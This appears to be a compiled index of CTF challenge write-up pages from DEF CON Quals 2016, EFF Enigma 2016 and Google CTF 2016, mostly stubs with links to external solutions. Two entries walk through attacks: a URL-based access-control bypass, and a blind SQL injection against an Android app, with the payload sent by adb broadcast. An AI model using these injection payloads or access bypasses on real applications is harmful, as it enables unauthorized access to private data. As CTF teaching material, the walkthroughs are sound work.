## Other write-ups and resources

* https://github.com/CH1M4C/CTF_Writeup/tree/master/2016/Defcon/legit_00002
# Def Con CTF Qualifiers : LEGIT_00003

**Category:** Cgc
**Points:** 
**Solves:** 
**Description:**



## Write-up

(TODO)

## Other write-ups and resources

* https://ctf.rip/defcon-quals-2016-legit_0003/
* https://fadec0d3.blogspot.de/2016/05/defcon-ctf-quals-2016-legit00003.html
# Def Con CTF Qualifiers : LEGIT_00003_patched

**Category:** Cgc
**Points:** 
**Solves:** 
**Description:**



## Write-up

(TODO)

## Other write-ups and resources

* https://fadec0d3.blogspot.de/2016/05/defcon-ctf-quals-2016-legit00003.html
# Def Con CTF Qualifiers : b3s23

**Category:** Coding
**Points:** 
**Solves:** 
**Description:**

> Welcome to b3s23. Enter x,y coordinates. Enter any other character to run.


## Write-up

(TODO)

## Other write-ups and resources

* https://gist.github.com/zTrix/bf572e0be977d4c2aced61541cc3a9d7
* https://github.com/phulin/ctf-writeups/blob/master/b3s23/writeup.md
# Def Con CTF Qualifiers : crippled

**Category:** Coding
**Points:** 
**Solves:** 
**Description:**

> How hard can a custom compiler be to write?


## Write-up

(TODO)

## Other write-ups and resources

* https://thegoonies.rocks/def-con-quals-2016-crippled-coding-challenges/
# Def Con CTF Qualifiers : banker

**Category:** Pwn
**Points:** 
**Solves:** 
**Description:**



## Write-up

(TODO)

## Other write-ups and resources

* https://github.com/DaramG/ctf-writeup/tree/master/2016_defcon/banker
# Def Con CTF Qualifiers : crunchtime

**Category:** Pwn
**Points:** 
**Solves:** 
**Description:**



## Write-up

(TODO)

## Other write-ups and resources

* https://github.com/DaramG/ctf-writeup/tree/master/2016_defcon/crunchtime
# Def Con CTF Qualifiers : feedme

**Category:** Pwn
**Points:** 
**Solves:** 
**Description:**



## Write-up

(TODO)

## Other write-ups and resources

* https://github.com/r00ta/myWriteUps/tree/master/DEFCON_2016/feedme
* https://blahcat.github.io/2016/05/23/defcon-ctf-2016-feedme.html
* http://rootfoo.org/ctf/2016-legitbs-ctf-quals-feedme
* https://github.com/CH1M4C/CTF_Writeup/tree/master/2016/Defcon/Feedme

# Def Con CTF Qualifiers : glados

**Category:** Pwn
**Points:** 
**Solves:** 
**Description:**



## Write-up

(TODO)

## Other write-ups and resources

* https://github.com/DaramG/ctf-writeup/tree/master/2016_defcon/glados
* https://gist.github.com/zachriggle/ee2436a1e2bbac0852eef7308a106359
# Def Con CTF Qualifiers : heapfun4u

**Category:** Pwn
**Points:** 
**Solves:** 
**Description:**

> Guess what, it is a heap bug.
> 
> 
> file heapfun4u_873c6d81dd688c9057d5b229cf80579e.quals.shallweplayaga.me:3957


## Write-up

(TODO)

## Other write-ups and resources

* https://github.com/DaramG/ctf-writeup/tree/master/2016_defcon/heapfun4u
* https://0xabe.io/ctf/exploit/2016/05/23/DEFCONCTF-heapfun4u.html
* https://blahcat.github.io/2016/05/24/defcon-ctf-2016-heapfun4u.html
* http://duksctf.github.io/DCquals2016-heapfun4u/
* http://toh.necst.it/defconquals2016/Heapfun4u/
# Def Con CTF Qualifiers : kiss

**Category:** Pwn
**Points:** 
**Solves:** 
**Description:**



## Write-up

(TODO)

## Other write-ups and resources

* http://j31d0.github.io/writeup/2016/06/05/defconqual2016-kiss/
* http://sibears.ru/labs/DEF-CON-CTF-Quals-2016-kiss/
# Def Con CTF Qualifiers : pillpusher

**Category:** Pwn
**Points:** 
**Solves:** 
**Description:**



## Write-up

(TODO)

## Other write-ups and resources

* https://github.com/DaramG/ctf-writeup/tree/master/2016_defcon/pillpusher
* https://github.com/CH1M4C/CTF_Writeup/tree/master/2016/Defcon/Pillpusher
# Def Con CTF Qualifiers : xkcd

**Category:** Pwn
**Points:** 
**Solves:** 
**Description:**

> <http://download.quals.shallweplayaga.me/be4bf26fcb93f9ab8aa193efaad31c3b/xkcd>
> 
> 
> xkcd_be4bf26fcb93f9ab8aa193efaad31c3b.quals.shallweplayaga.me:1354
> 
> 
> Might want to read that comic as well... 1354


## Write-up

(TODO)

## Other write-ups and resources

* https://github.com/smokeleeteveryday/CTF_WRITEUPS/tree/master/2016/DEFCONCTF/babysfirst/xkcd
* http://sibears.ru/labs/DEF-CON-CTF-Quals-2016-xkcd/
* https://djsec.wordpress.com/2016/05/23/defcon-ctf-quals-2016-xkcd/
# Def Con CTF Qualifiers write-ups

* <TODO>
* [Scoreboard](TODO) or [local alternative](TODOLOCAL)

## Repo-local write-ups

* none yet

## External write-ups only

* [pwn/pillpusher](pwn/pillpusher)
* [pwn/heapfun4u](pwn/heapfun4u)
* [pwn/xkcd](pwn/xkcd)
* [pwn/banker](pwn/banker)
* [pwn/feedme](pwn/feedme)
* [pwn/crunchtime](pwn/crunchtime)
* [pwn/glados](pwn/glados)
* [pwn/kiss](pwn/kiss)
* [cgc/easy-prasky](cgc/easy-prasky)
* [cgc/LEGIT_00002](cgc/LEGIT_00002)
* [cgc/LEGIT_00003](cgc/LEGIT_00003)
* [cgc/LEGIT_00003_patched](cgc/LEGIT_00003_patched)
* [cgc/334-666-1000-cuts](cgc/334-666-1000-cuts)
* [reversing/baby-re](reversing/baby-re)
* [reversing/step](reversing/step)
* [reversing/amadhj](reversing/amadhj)
* [coding/b3s23](coding/b3s23)
* [coding/crippled](coding/crippled)

## Missing write-ups

* none yet
# Def Con CTF Qualifiers : amadhj

**Category:** Reversing
**Points:** 
**Solves:** 
**Description:**

> Reverse me and get the flag. Get it here.
> 
> Service here
> 
> amadhj_b76a229964d83e06b7978d0237d4d2b0.quals.shallweplayaga.me:4567
> 


## Write-up

(TODO)

## Other write-ups and resources

* http://www.repo.kr/2016/05/2016-def-con-ctf-qualifier-reversing.html
# Def Con CTF Qualifiers : baby-re

**Category:** Reversing
**Points:** 
**Solves:** 
**Description:**

> Get to reversing.


## Write-up

(TODO)

## Other write-ups and resources

* https://github.com/smokeleeteveryday/CTF_WRITEUPS/tree/master/2016/DEFCONCTF/babysfirst/baby-re
* http://hack.carleton.team/2016/05/21/defcon-ctf-qualifier-2016-baby-re/
* https://github.com/ByteBandits/writeups/tree/master/defcon-ctf-qualifier-2016/babys-first/baby-re/sudhackar
* http://sibears.ru/labs/DEF-CON-CTF-Quals-2016-baby-re/
* http://duksctf.github.io/DCquals2016-baby-re/
* https://ctftime.org/writeup/3403
* http://p1kachu.pluggi.fr/writeup/re/2016/05/23/defconquals-baby-re-writeup/
# Def Con CTF Qualifiers : step

**Category:** Reversing
**Points:** 
**Solves:** 
**Description:**

> Step by step.
> 
> 
> Running at step_8330232df7a7e389a20dd37eb55dfc13.quals.shallweplayaga.me:2345
> 


## Write-up

(TODO)

## Other write-ups and resources

* https://github.com/smokeleeteveryday/CTF_WRITEUPS/tree/master/2016/DEFCONCTF/reversing/step
# EFF Capture the Flag @ Enigma 2016 - Level 0 The Social Notwork

** Description:

> X-net founder, M1k3y has gained access to "Transbay Interlink", the private social network that bay area police departments use for sharing information. See if you can find any useful information.
>
> https://level0x0.eff-ctf.org/

## Write-up

by [LiveOverflow](https://github.com/LiveOverflow)

When we visit the website we get redirected to: https://level0x0.eff-ctf.org/home/M1k3y

We see that we have an unread message from the "Us Department of National Security": https://level0x0.eff-ctf.org/user/M1k3y/message/1

The url for our private message contains our username `M1k3y`. So we could try to change it to another username `usdhs` - https://level0x0.eff-ctf.org/user/usdhs/message/1

which gives us access to the secret message from "Us Department of National Security" which contains the flag `constitutionalrights`

## Other write-ups and resources

* <https://youtube.com/watch?v=LlSI6ErrbDI?t=38s>
# EFF Capture the Flag @ Enigma 2016 - Level 1 Tweeting Twerps

** Description:

> We have discovered an internal message board used by the Dept. of National Security. It looks like it was recently hacked, but the admin hasn't fixed it yet...
>
> https://level0x1.eff-ctf.org/

## Write-up

(TODO)

## Other write-ups and resources

* <https://youtube.com/watch?v=LlSI6ErrbDI?t=1m31s>
# EFF Capture the Flag @ Enigma 2016 - Level 2 Reverse Engineering for Fun and No Profit

** Description:

> X-net agents have recovered a Department of National Secruity password vault program called DNSVault, but we need help cracking it.
>
> https://level0x2.eff-ctf.org/

## Write-up

(TODO)

## Other write-ups and resources

* <https://youtube.com/watch?v=LlSI6ErrbDI?t=4m25s>
# EFF Capture the Flag @ Enigma 2016 - Level 3 Never Roll Your Own Crypto

** Description:

> A new crypto system being used by intelligence agencies, we have intercepted an encrypted message - can you decipher it?
>
> https://level0x3.eff-ctf.org/

## Write-up

(TODO)

## Other write-ups and resources

* <https://youtube.com/watch?v=LlSI6ErrbDI?t=8m56s>
# EFF Capture the Flag @ Enigma 2016 - Level 4 A Mole in the Ranks

** Description:

> Someone is trying to give the Department of National Security information about X-NET. We should try to get them to give the info to us instead.
>
> https://level0x4.eff-ctf.org/

## Write-up

(TODO)

## Other write-ups and resources

* <https://youtube.com/watch?v=LlSI6ErrbDI?t=13m44s>
# EFF Capture the Flag @ Enigma 2016 - Level 5 What an enigma!

** Description:

> Enigma conference has a suprise guest! Can you figure out who it is?
>
> https://level0x5.eff-ctf.org/

## Write-up

(TODO)

## Other write-ups and resources

(TODO)
# EFF Capture the Flag @ Enigma 2016

* <https://eff-ctf.org/>
* [Scoreboard](https://eff-ctf.org/scoreboard) or [score](score.txt)

## Completed write-ups

* [level0x0](level0x0)

## External write-ups only

* [level0x1](level0x1)
* [level0x2](level0x2)
* [level0x3](level0x3)
* [level0x4](level0x4)

# Missing write-ups

* [level0x5](level0x5)
# google-ctf-2016 : eucalypt-forest-100

**Category:** Crypto
**Points:** 100
**Solves:** 111
**Description:**

Can you find any weaknesses in the use of the encryption keys?

Head over to <eucalypt-forest.ctfcompetition.com>

## Write-up

(TODO)

## Other write-ups and resources

* https://ctftime.org/writeup/3269
# google-ctf-2016 : crypto

**Category:** Crypto
**Points:** 
**Solves:** 
**Description:**



## Write-up

(TODO)

## Other write-ups and resources

* none yet
# google-ctf-2016 : rich-man-300

**Category:** Crypto
**Points:** 300
**Solves:** 2
**Description:**

Can you solve this? Running on ssl-added-and-removed-here.ctfcompetition.com:10981

rich-man-stripped

## Write-up

(TODO)

## Other write-ups and resources

* <https://github.com/luc-lynx/richman/blob/master/README.md>
# google-ctf-2016 : rsacalc-300

**Category:** Crypto
**Points:** 300
**Solves:** 24
**Description:**

Connect to ssl-added-and-removed-here.ctfcompetition.com:59999

Try our new Cloud Computing Service.

Note: Encrypt and decrypt operations expect base64-encoded input.

## Write-up

(TODO)

## Other write-ups and resources

* https://neg9.org/news/2016/5/4/google-ctf-2016-rsacalc-crypto-300-writeup
# google-ctf-2016 : spotted-wobbegong-100

**Category:** Crypto
**Points:** 100
**Solves:** 15
**Description:**

Are you able to defeat 1024-bit RSA? <https://spotted-wobbegong.ctfcompetition.com/>

## Write-up

(TODO)

## Other write-ups and resources

* http://mslc.ctf.su/wp/google-ctf-spotted-wobbegong-crypto-100/
* https://ctftime.org/writeup/3267
# google-ctf-2016 : wolf-spider-125

**Category:** Crypto
**Points:** 125
**Solves:** 31
**Description:**

Continuing on from Eucalypt Forest - can you break Message Authentication in Wolf Spider <https://wolf-spider.ctfcompetition.com/>


## Write-up

(TODO)

## Other write-ups and resources

* https://thegoonies.rocks/google-ctf-wolf-spider-web/
* http://mslc.ctf.su/wp/google-ctf-wolf-spider-crypto-125/
# google-ctf-2016 : woodman-100

**Category:** Crypto
**Points:** 100
**Solves:** 57
**Description:**

How honest are you?

Running here <https://giant-goannas.ctfcompetition.com/>

## Write-up

(TODO)

## Other write-ups and resources

* https://gist.github.com/kalloc/b848ba3beabb9d0e34902cd1be95d3b5
* https://github.com/r00ta/myWriteUps/blob/master/GoogleCTF/woodman/README.md
* http://mslc.ctf.su/wp/google-ctf-woodman-crypto-100/
# google-ctf-2016 : forced-puns-125

**Category:** Exploitation
**Points:** 125
**Solves:** 18
**Description:**
Running on ssl-added-and-removed-here.ctfcompetition.com:11111

Can you exploit the following binary? Don't forget to account for SSL off-loading.

There are some resources here that may be useful.


forced-puns.tar.gz

## Write-up

(TODO)

## Other write-ups and resources

* https://github.com/ret2libc/ctfs/tree/master/googlectf2016/forced_puns
* https://0xabe.io/ctf/exploit/2016/05/02/GoogleCTF-forced-puns.html
# google-ctf-2016 : gulbaru-gecko-400

**Category:** Exploitation
**Points:** 400
**Solves:** 0
**Description:**
Are you able to exploit this binary and get the flags from binary?

Flag is in /app/flag. Connect to ssl-added-and-removed-here.ctfcompetition.com:16384

gulbaru-gecko.tar.xz

## Write-up

(TODO)

## Other write-ups and resources

* none yet
# google-ctf-2016 : leeky-pipes-bad-log-200

**Category:** Exploitation
**Points:** 200
**Solves:** 1
**Description:**
Prerequisites not met. (need help for another team, if they unlocked it)

## Write-up

(TODO)

## Other write-ups and resources

* none yet
# google-ctf-2016 : exploitation

**Category:** Exploitation
**Points:** 
**Solves:** 
**Description:**



## Write-up

(TODO)

## Other write-ups and resources

* none yet
# google-ctf-2016 : silent-raindrops-300

**Category:** Exploitation
**Points:** 300
**Solves:** 0
**Description:**
Can you find and exploit the vulnerabilities in this program? Running on ssl-added-and-removed-here.ctfcompetition.com:64641. Don't forget to account for SSL offloading.

Flag can be found in /flag

There are some resources here that may be useful.


silent-raindrops-fixed.tgz


## Write-up

(TODO)

## Other write-ups and resources

* none yet
# google-ctf-2016 : tin-roof-150

**Category:** Exploitation
**Points:** 150
**Solves:** 17
**Description:**
Coding challenge - can you find a file ending with }?

Access Tin Roof at ssl-added-and-removed-here.ctfcompetition.com:64611.

There are some resources here that may be useful.

tin-roof.tar.gz

## Write-up

(TODO)

## Other write-ups and resources

* none yet
# google-ctf-2016 : a-cute-stegosaurus-100

**Category:** Forensics
**Points:** 100
**Solves:** 26
**Description:**
Admire our cutest Stegosaurus ever!

stego.pcap

## Write-up

(TODO)

## Other write-ups and resources

* http://fadec0d3.blogspot.com/2016/05/google-ctf-2016-cute-stegosaurus-100.html
* http://sibears.ru/labs/googlectf2016stegosaurus/
# google-ctf-2016 : for1-100

**Category:** Forensics
**Points:** 100
**Solves:** 47
**Description:**
Find the flag
<https://storage.googleapis.com/ctf-challenges/dump1.raw.lzma>

## Write-up

(TODO)

## Other write-ups and resources

* https://github.com/h4x0r/ctf-writeups/blob/master/Google-CTF-2016/For1/README.md
* https://github.com/p4-team/ctf/blob/master/2016-05-01-googlectf/for1/README.md
* https://www.rootusers.com/google-ctf-2016-forensic-for1-write-up/
* https://github.com/r00ta/myWriteUps/tree/master/GoogleCTF/for1
* https://github.com/MrMugiwara/WriteupsCTF/tree/master/Google-CTF-2016/For1
# google-ctf-2016 : for2-200

**Category:** Forensics
**Points:** 200
**Solves:** 203
**Description:**
Find the flag.

capture.pcapng

## Write-up

(TODO)

## Other write-ups and resources

* <https://www.rootusers.com/google-ctf-2016-forensic-for2-write-up/>
* <https://amritabi0s.wordpress.com/2016/06/15/google-ctf-for2/>
* https://github.com/p4-team/ctf/blob/master/2016-05-01-googlectf/for2/README.md
* http://b0tchsec.com/2016/googlectf/for2
* http://disconnect3d.pl/google-ctf-2016-forensics-for-2-writeup/
* https://hernan.de/blog/2016/04/29/google-ctf-2016-for2/
* https://ctftime.org/writeup/3395
# google-ctf-2016 : in-recorded-conversation-25

**Category:** Forensics
**Points:** 25
**Solves:** 693
**Description:**
Can you find the flag?

irc.pcap

## Write-up

(TODO)

## Other write-ups and resources

* https://github.com/bl4de/ctf/tree/master/2016/Google_CTF_2016/In_Recorded_Conversation_Forensic_25
* http://fadec0d3.blogspot.com/2016/05/google-ctf-2016-various-no-big-deal-pt.html
* http://www.slideshare.net/sehanlee7/googlectf-2016-in-recorded-conversation-writeup-verkorean
# google-ctf-2016 : magic-code-250

**Category:** Forensics
**Points:** 250
**Solves:** 2
**Description:**
Can you recover the magic code?

MagicCode.png

## Write-up

(TODO)

## Other write-ups and resources

* http://fadec0d3.blogspot.com/2016/05/google-ctf-2016-magic-codes-250.html
# google-ctf-2016 : no-big-deal-50

**Category:** Forensics
**Points:** 50
**Solves:** 214
**Description:**
Sometimes the answer is immediately obvious, sometimes it's obscured.

Find the answer in here <https://storage.googleapis.com/ctf-staging-challenges/no-big-deal.pcap.gz>

## Write-up

(TODO)

## Other write-ups and resources

* https://github.com/EspacioTeam/write-ups/tree/master/2016/Google/No_Big_Deal
* https://github.com/h4x0r/ctf-writeups/blob/master/Google-CTF-2016/No-Big-Deal/README.md
* https://0x90r00t.com/2016/05/02/google-capture-the-flag-2016-forensics-50-no-big-deal-write-up/
* http://fadec0d3.blogspot.com/2016/05/google-ctf-2016-various-no-big-deal-pt.html
* https://ctftime.org/writeup/3289
* http://www.slideshare.net/sehanlee7/googlectf-2016-no-big-deal-writeup-verkorean
# google-ctf-2016 : no-big-deal-part-2-250

**Category:** Forensics
**Points:** 250
**Solves:** 35
**Description:**
Prerequisites not met.  (Need help if another team made it this far)

## Write-up

(TODO)

## Other write-ups and resources

* https://0x90r00t.com/2016/05/02/google-capture-the-flag-2016-forensics-250-no-big-deal-part-2-write-up/
* https://github.com/amelkiy/write-ups/tree/master/GoogleCTF-2016/NoBigDeal2
# google-ctf-2016 : forensics

**Category:** Forensics
**Points:** 
**Solves:** 
**Description:**



## Write-up

(TODO)

## Other write-ups and resources

* none yet
# google-ctf-2016 : bonafortuna-1194-15

**Category:** Homework
**Points:** 
**Solves:** 
**Description:**



## Write-up

(TODO)

## Other write-ups and resources

* none yet
# google-ctf-2016 : bonafortuna-443-15

**Category:** Homework
**Points:** 
**Solves:** 
**Description:**



## Write-up

(TODO)

## Other write-ups and resources

* none yet
# google-ctf-2016 : eastern-digital-15

**Category:** Homework
**Points:** 15
**Solves:** 
**Description:**



## Write-up

(TODO)

## Other write-ups and resources

* none yet
# google-ctf-2016 : jail-break-100

**Category:** Homework
**Points:** 
**Solves:** 
**Description:**



## Write-up

(TODO)

## Other write-ups and resources

* none yet
# google-ctf-2016 : jekyll-15

**Category:** Homework
**Points:** 15
**Solves:** 
**Description:**



## Write-up

(TODO)

## Other write-ups and resources

* https://github.com/philippelaulheret/ctfs/tree/master/google_ctf_2016/jekyll
* http://mslc.ctf.su/wp/google-ctf-jekyll-crypto/
# google-ctf-2016 : jump-outdated-elephants-15

**Category:** Homework
**Points:** 15
**Solves:** 
**Description:**



## Write-up

(TODO)

## Other write-ups and resources

* https://ctftime.org/writeup/3291
# google-ctf-2016 : need-feedback-300

**Category:** Homework
**Points:** 
**Solves:** 
**Description:**

## Write-up

(TODO)

## Other write-ups and resources

* <https://github.com/luc-lynx/need_feedback_writeup/blob/master/README.md>
# google-ctf-2016 : pound-cake-15

**Category:** Homework
**Points:** 
**Solves:** 
**Description:**



## Write-up

(TODO)

## Other write-ups and resources

* none yet
# google-ctf-2016 : prison-break-100

**Category:** Homework
**Points:** 
**Solves:** 
**Description:**



## Write-up

(TODO)

## Other write-ups and resources

* none yet
# google-ctf-2016 : homework

**Category:** Homework
**Points:** 
**Solves:** 
**Description:**



## Write-up

(TODO)

## Other write-ups and resources

* none yet
# google-ctf-2016 : remote-pwnage-call-15

**Category:** Homework
**Points:** 
**Solves:** 
**Description:**



## Write-up

(TODO)

## Other write-ups and resources

* none yet
# google-ctf-2016 : sand-blocks-15

**Category:** Homework
**Points:** 
**Solves:** 
**Description:**



## Write-up

(TODO)

## Other write-ups and resources

* none yet
# google-ctf-2016 : tie-dye-ftpd-100

**Category:** Homework
**Points:** 
**Solves:** 
**Description:**



## Write-up

(TODO)

## Other write-ups and resources

* none yet
# google-ctf-2016 : tie-dye-socks-15

**Category:** Homework
**Points:** 
**Solves:** 
**Description:**



## Write-up

(TODO)

## Other write-ups and resources

* none yet
# google-ctf-2016 : tie-dye-socks-32-bit-rce-100

**Category:** Homework
**Points:** 
**Solves:** 
**Description:**



## Write-up

(TODO)

## Other write-ups and resources

* none yet
# google-ctf-2016 : tie-dye-socks-64-bit-rce-100

**Category:** Homework
**Points:** 
**Solves:** 
**Description:**



## Write-up

(TODO)

## Other write-ups and resources

* none yet
# google-ctf-2016 : time-to-go-150

**Category:** Homework
**Points:** 
**Solves:** 
**Description:**



## Write-up

(TODO)

## Other write-ups and resources

* none yet
# google-ctf-2016 : can-you-repo-it-5

**Category:** Mobile
**Points:** 5
**Solves:** 208
**Description:**

Do you think the developer of Ill Intentions knows how to set up public repositories?


## Write-up

(TODO)

## Other write-ups and resources

* <https://blog.lse.epita.fr/articles/78-google-capture-the-flag-2016-mobile-category.html>
* https://github.com/yohanes/write-ups/tree/master/google-ctf/mobile-can-you-repo-it
# google-ctf-2016 : ill-intentions-150

**Category:** Mobile
**Points:** 150
**Solves:** 89
**Description:**
Do you have have ill intentions?


## Write-up

(TODO)

## Other write-ups and resources

* <http://ift.tt/1NPPSpB>
* <https://blog.lse.epita.fr/articles/78-google-capture-the-flag-2016-mobile-category.html>
* https://github.com/yohanes/write-ups/tree/master/google-ctf/mobile-ill-intentions
* https://github.com/dpox/ctfs/blob/master/googlectf2016/IllIntentions.md
* https://ctf.rip/googlectf-2016-ill-intentions-mobile-challenge/
* http://blog.squareroots.de/en/2016/05/google-ctf-2016-ill-intentions-mobile/
* https://github.com/d3rezz/Google-Capture-The-Flag-2016
* http://pecey.github.io/blog/2016/05/04/google-ctf-ill-intentions.html
* http://veehan.github.io/posts/google_ctf_16_ill_intentions/
# google-ctf-2016 : little-bobby-application-250

**Category:** Mobile
**Points:** 250
**Solves:** 24
**Description:**

Find the vulnerability, develop an exploit, and when you're ready, submit your APK to https://bottle-brush-tree.ctfcompetition.com. Can take up to 15 minutes to return the result.

## Write-up

by [bburky](https://github.com/bburky)

First, using [d2j-dex2jar](https://sourceforge.net/projects/dex2jar/) extract the apk and create a jar:

    $ d2j-dex2jar BobbyApplication_CTF.apk

After opening the jar in [jd-gui](http://jd.benow.ca/), the first thing to notice is that on application startup, the BroadcastReceiver called LoginReceiver is registered. Any application can receive these broadcasts because no permissions are specified. Our exploit application will be able to receive these broadcasts too.

```java
protected void onCreate(Bundle paramBundle) {
    Log.d("Startup", "Bobby's Application is now running");
    super.onCreate(paramBundle);
    paramBundle = new IntentFilter();
    new LocalDatabaseHelper(getApplicationContext());
    paramBundle.addAction("com.bobbytables.ctf.myapplication_INTENT");
    registerReceiver(new LoginReceiver(), paramBundle);
    ...
```

Looking in LoginReceiver, we can see how these broadcasts are handled:

```java
public void onReceive(Context paramContext, Intent paramIntent) {
    Object localObject = paramIntent.getStringExtra("username");
    paramIntent = paramIntent.getStringExtra("password");
    Log.d("Received", (String)localObject + ":" + paramIntent);
    paramIntent = new LocalDatabaseHelper(paramContext).checkLogin((String)localObject, paramIntent);
    localObject = new Intent();
    ((Intent)localObject).setAction("com.bobbytables.ctf.myapplication_OUTPUTINTENT");
    ((Intent)localObject).putExtra("msg", paramIntent);
    paramContext.sendBroadcast((Intent)localObject);
}
```

Apparently this application expects a broadcast with the the action `com.bobbytables.ctf.myapplication_INTENT`, containing two extras `username` and `password`.

Let's install the vulnerable app into the emulator to test it. Install the app and then open logcat. Use the following adb command to test LoginReceiver:

    $ adb shell am broadcast -a com.bobbytables.ctf.myapplication_INTENT -e username admin -e password hunter2

The following lines will appear in logcat:

    05-02 18:58:43.145  2646  2646 D Received: admin:hunter2
    05-02 18:58:43.147  2646  2646 D Username: admin
    05-02 18:58:43.148  2646  2646 D Result  : User does not exist

In LoginReceiver we can see that the result will be also sent out as a permissionless broadcast. Our exploit app will be able to receive it. The message "User does not exist", the result of checkLogin(), will be sent to our app in the broadcast.

Next we look at checkLogin() in LocalDatabaseHelper. We immediately see a SQL injection vulnerability in the rawQuery() call. However our attack will have to be a blind SQL injection because the only results will get are "Incorrect password" when the query is successful, and "User does not exist" when it is not.

```java
public String checkLogin(String paramString1, String paramString2) {
    SQLiteDatabase localSQLiteDatabase = getReadableDatabase();
    Cursor localCursor = localSQLiteDatabase.rawQuery("select password,salt from users where username = \"" + paramString1 + "\"", null);
    Log.d("Username", paramString1);
    if ((localCursor != null) && (localCursor.getCount() > 0)) {
            localCursor.moveToFirst();
            paramString1 = localCursor.getString(0);
            String str = localCursor.getString(1);
            localCursor.close();
            localSQLiteDatabase.close();
        if (Utils.calcHash(paramString2 + str).equals(paramString1)) {
            Log.d("Result", "Logged in");
            return "Logged in";
        }
        Log.d("Result", "Incorrect password");
        return "Incorrect password";
    }
    if (localCursor != null) {
        localCursor.close();
    }
    localSQLiteDatabase.close();
    Log.d("Result", "User does not exist");
    return "User does not exist";
}
```

First, let's check what the database looks like by examining the app's database directly (you need to have registered a user in the app first though):

    $ adb shell 'sqlite3 /data/data/bobbytables.ctf.myapplication/databases/LocalDatabase.db "SELECT * FROM users"'
    1|test|08fdc2c757be2ea1067f0c36d4ca2634|ctf{An injection is all you need to get this flag - 08fdc2c757be2ea1067f0c36d4ca2634}|3107

We will be extracting the `flag` field of the table. We can use SQLite's [substr() function](https://www.sqlite.org/lang_corefunc.html) to extract the flag character by character. The username `" or substr(flag, 1, 1) = "c" --` can be used to check if the first character of the flag is "c". We just need to iterate over the characters of the MD5, only 0-9 and a-f, so this shouldn't be too bad for blind SQLi.

We can test our injection with `am`, checking the first character of the flag:

    $ adb shell 'am broadcast -a com.bobbytables.ctf.myapplication_INTENT -e username "\" or substr(flag, 1, 1) = \"c\" --" -e password hunter2'

Success! In logcat "Incorrect password" is printed, indicating that the query was successful.

To create a full exploit, we need to create our own app, register a BroadcastReceiver for `com.bobbytables.ctf.myapplication_OUTPUTINTENT`, and send broadcast messages to `com.bobbytables.ctf.myapplication_INTENT`. Because there's no interaction with the emulator, we need to start the exploit from our Activity's onCreate() method. We are given the logcat output from the emulator, so we can just log the flag after we find it.

The full source of the exploit Activity is in [ExploitActivity.java](ExploitActivity.java). Create a new hello world app in an Android IDE and replace it's Activity with ExploitActivity to use it.

## Other write-ups and resources

* <https://blog.lse.epita.fr/articles/78-google-capture-the-flag-2016-mobile-category.html>
* https://github.com/yohanes/write-ups/tree/master/google-ctf/mobile-little-bobby-application
* http://veehan.github.io/posts/google_ctf_16_little_bobby_application/
# google-ctf-2016 : mobile

**Category:** Mobile
**Points:** 
**Solves:** 
**Description:**



## Write-up

(TODO)

## Other write-ups and resources

* none yet
# google-ctf-2016 : opabina-regalis-downgrade-attack-100

**Category:** Networking
**Points:** 100
**Solves:** 53
**Description:**
Following on from Opabina Regalis - Token Fetch, this challenge listens on ssl-added-and-removed-here.ctfcompetition.com:20691.

To ensure that your code works as expected, you should use the following test case:
~~~~
   chk = CalcPass("Mufasa", "testrealm@host.com", "Circle Of Life", "GET", "/dir/index.html", "dcd98b7102dd2f0e8b11d0f600bfb0c093", "00000001", "0a4f113b")
  if chk != "6629fae49393a05397450978507c4ef1" {
    your_calculation_is_incorrect();
  }
~~~~
Additionally, you should format your Exchange_Headers such as:

~~~~
  v.Key = proto.String("Authorization")
  v.Value = proto.String(`Digest username="Mufasa",realm="testrealm@host.com",nonce="dcd98b7102dd2f0e8b11d0f600bfb0c093",uri="/dir/index.html",qop=auth,nc=00000001,cnonce="0a4f113b",response="6629fae49393a05397450978507c4ef1",opaque="5ccc069c403ebaf9f0171e9517f40e41"`)
~~~~

## Write-up

(TODO)

## Other write-ups and resources

* https://github.com/Blystad/googlectf_writeups/tree/master/networking/opabina_regalis_downgrade_attack
* https://blog.nfrost.me/2016/05/01/google-ctf-2016-downgrade-attack.html
# google-ctf-2016 : opabina-regalis-input-validation-100

**Category:** Networking
**Points:** 100
**Solves:** 49
**Description:**
Following on from Opabina Regalis - Fetch Token and Opabina Regalis - Downgrade Attack - can you find an input validation request that would allow you to access otherwise protected resources?

This <https://en.wikipedia.org/wiki/Digest_access_authentication> may give you some inspiration on where the issue lies.

Listening on port 12001 on ssl-added-and-removed-here.ctfcompetition.com

## Write-up

(TODO)

## Other write-ups and resources

* https://github.com/Blystad/googlectf_writeups/tree/master/networking/opabina_regalis_input_validation
* https://blog.nfrost.me/2016/05/01/google-ctf-2016-input-validation.html
# google-ctf-2016 : opabina-regalis-redirect-100

**Category:** Networking
**Points:** 100
**Solves:** 55
**Description:**
Following on from Opabina Regalis - Token Fetch, can you get access to the /protected/secret URI?

Listening on port 13001 on ssl-added-and-removed-here.ctfcompetition.com

## Write-up

(TODO)

## Other write-ups and resources

* https://github.com/Blystad/googlectf_writeups/tree/master/networking/opabina_regalis_redirect
* https://blog.nfrost.me/2016/05/01/google-ctf-2016-redirect.html
# google-ctf-2016 : opabina-regalis-ssl-stripping-75

**Category:** Networking
**Points:** 75
**Solves:** 52
**Description:**
Following on from Opabina Regalis - Fetch Token, can you implement an SSL stripping attack?

Listening on port 19121 on ssl-added-and-removed-here.ctfcompetition.com

## Write-up

(TODO)

## Other write-ups and resources

* https://github.com/Blystad/googlectf_writeups/tree/master/networking/opabina_regalis_ssl_stripping
# google-ctf-2016 : opabina-regalis-token-fetch-50

**Category:** Networking
**Points:** 50
**Solves:** 79
**Description:**
There are a variety of client side machines that have access to certain websites we'd like to access. We have a system in place, called "Opabina Regalis" where we can intercept and modify HTTP requests on the fly. Can you implement some attacks to gain access to those websites?

Opabina Regalis makes use of Protocol Buffers <https://developers.google.com/protocol-buffers/> to send a short snippet of the HTTP request for modification.

Here's the protocol buffer definition used:
~~~~
package main;

message Exchange {
        enum VerbType {
                GET = 0;
                POST = 1;
        }

        message Header {
                required string key = 1;
                required string value = 2;
        }

        message Request {
                required VerbType ver = 1; // GET
                required string uri = 2; // /blah
                repeated Header headers = 3; // Accept-Encoding: blah
                optional bytes body = 4;
        }

        message Reply {
                required int32 status = 1; // 200 or 302
                repeated Header headers = 2;
                optional bytes body = 3;
        }

        oneof type {
                Request request = 1;
                Reply reply = 2;
        }
}
~~~~
The network protocol uses a 32-bit little endian integer representing the length of the marshalled protocol buffer, followed by the marshalled protocol buffer.

Listening on port 1876 on ssl-added-and-removed-here.ctfcompetition.com


## Write-up

(TODO)

## Other write-ups and resources

